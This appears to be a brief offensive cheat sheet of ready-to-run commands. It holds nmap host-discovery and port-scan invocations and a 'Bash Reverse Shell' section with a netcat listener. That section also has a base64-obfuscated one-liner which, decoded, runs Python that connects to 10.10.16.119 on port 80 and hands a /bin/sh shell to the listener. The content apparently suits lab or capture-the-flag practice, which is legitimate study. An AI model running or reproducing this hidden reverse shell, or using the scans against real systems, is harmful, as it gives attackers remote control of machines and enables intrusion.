TCP Pings
```
sudo nmap -vv -sn -n -PS22,80,443 -PA80,443 HOST
```

SYN Scan
```
sudo nmap -vv -Pn -n --max-retries=2 --top-ports=20 HOST
```

ACK Scan
```
sudo nmap -vv -Pn -n --top-ports=20 -sA HOST
```

UDP Probe
```
sudo nmap -vv -Pn -n -sU -p PORT HOST
```

Bash Reverse Shell
```
sudo nc -lvnp 80
```
```
echo ZXhwb3J0IFJIT1NUPSIxMC4xMC4xNi4xMTkiO2V4cG9ydCBSUE9SVD04MDtweXRob24zIC1jICdpbXBvcnQgc3lzLHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KChvcy5nZXRlbnYoIlJIT1NUIiksaW50KG9zLmdldGVudigiUlBPUlQiKSkpKTtbb3MuZHVwMihzLmZpbGVubygpLGZkKSBmb3IgZmQgaW4gKDAsMSwyKV07cHR5LnNwYXduKCIvYmluL3NoIikn | base64 -d | bash
```
